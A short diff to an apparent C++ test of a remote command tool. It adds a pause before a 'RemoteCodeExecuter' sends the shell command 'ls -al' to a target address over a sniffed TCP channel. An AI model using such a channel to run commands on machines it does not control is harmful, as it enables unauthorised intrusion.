@@ -99,6 +99,7 @@ void testRce() {
     netEngine.LoopCallbacks.push_back(RemoteCodeExecuter::netCallback);
     netEngine.startSniff("ip and tcp");
 
+    sleep(1);
     RemoteCodeExecuter::sendCommand(&netEngine, daddr, "ls -al");
 
     sleep(30);
